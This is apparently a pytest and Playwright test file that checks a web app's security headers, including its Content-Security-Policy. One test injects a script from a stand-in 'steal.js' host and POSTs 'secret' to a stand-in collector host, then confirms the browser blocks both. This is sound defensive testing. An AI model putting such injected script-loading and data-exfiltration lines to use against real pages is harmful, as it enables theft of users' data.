"""Pages and the API both say not to sniff them, not to frame them
elsewhere, and how much of a referrer to send (§836)."""
from __future__ import annotations

import os
import urllib.request

from conftest import WEB_BASE

EXPECTED = {
    "x-content-type-options": "nosniff",
    "x-frame-options": "SAMEORIGIN",
    "referrer-policy": "strict-origin-when-cross-origin",
}


def headers_of(url: str) -> dict[str, list[str]]:
    with urllib.request.urlopen(url, timeout=60) as response:
        got: dict[str, list[str]] = {}
        for name, value in response.headers.items():
            got.setdefault(name.lower(), []).append(value)
        return got


def test_a_page_carries_them() -> None:
    got = headers_of(f"{WEB_BASE}/")
    assert {k: got.get(k) for k in EXPECTED} == {k: [v] for k, v in EXPECTED.items()}


def test_a_page_does_not_name_its_server() -> None:
    """§923: nothing to match against a list of advisories."""
    assert "x-powered-by" not in headers_of(f"{WEB_BASE}/")


def directives(policy: str) -> dict[str, list[str]]:
    return {name: values for name, *values in (part.split() for part in policy.split(";"))}


def test_a_page_says_what_it_may_not_load(page) -> None:
    """§860, §993: a Content-Security-Policy - and a page that still works
    under it. Every signed-in browser test checks the second half too
    (conftest's `_signed_in`)."""
    [policy] = headers_of(f"{WEB_BASE}/").get("content-security-policy", [])
    got = directives(policy)
    # A build's policy, or `next dev`'s, which is the build's plus hot
    # reload's eval and socket (apps/web/src/lib/csp.test.ts holds the two
    # together). Which one is serving is the suite's to say (§1001).
    if os.environ.get("ANCHOR_WEB_BUILD") == "production":
        assert got["script-src"] == ["'self'", "'unsafe-inline'"]
        assert got["connect-src"] == ["'self'", "https://*.amazoncognito.com"]
    else:
        assert got["script-src"] == ["'self'", "'unsafe-inline'", "'unsafe-eval'"]
        assert got["connect-src"] == ["'self'", "https://*.amazoncognito.com", "ws:", "wss:"]
    assert got["object-src"] == ["'none'"] and got["frame-ancestors"] == ["'self'"]
    violations: list[str] = []
    page.on("console", lambda m: violations.append(m.text)
            if "Content Security Policy" in m.text else None)
    page.goto(f"{WEB_BASE}/home")
    page.get_by_role("heading", name="Choose a workspace").wait_for()
    assert violations == []


def test_a_script_from_elsewhere_is_not_run_and_nothing_is_sent_elsewhere(page) -> None:
    """What the policy is for: something that did get into a page can
    neither load a script from another origin nor post what it read to one.
    Both are refused by the browser before any request leaves it."""
    page.goto(f"{WEB_BASE}/home")
    page.get_by_role("heading", name="Choose a workspace").wait_for()
    refused = page.evaluate("""() => new Promise((resolve) => {
        const seen = [];
        document.addEventListener("securitypolicyviolation", (e) => {
            seen.push(e.effectiveDirective);
            if (seen.length === 2) resolve(seen.sort());
        });
        const script = document.createElement("script");
        script.src = "https://scripts.example.invalid/steal.js";
        document.head.appendChild(script);
        fetch("https://collector.example.invalid/", {method: "POST", body: "secret"})
            .catch(() => {});
        setTimeout(() => resolve(seen.sort()), 5000);
    })""")
    assert refused == ["connect-src", "script-src-elem"]
    # Every other test fails on a refusal (conftest's `_signed_in`); here
    # they are the point.
    page.csp_violations.clear()  # type: ignore[attr-defined]


def test_an_api_answer_through_the_web_origin_carries_each_once() -> None:
    """The API's own, passed through the dev proxy - once each, not once from
    the API and again from the web app."""
    got = headers_of(f"{WEB_BASE}/api/health")
    assert {k: got.get(k) for k in EXPECTED} == {k: [v] for k, v in EXPECTED.items()}
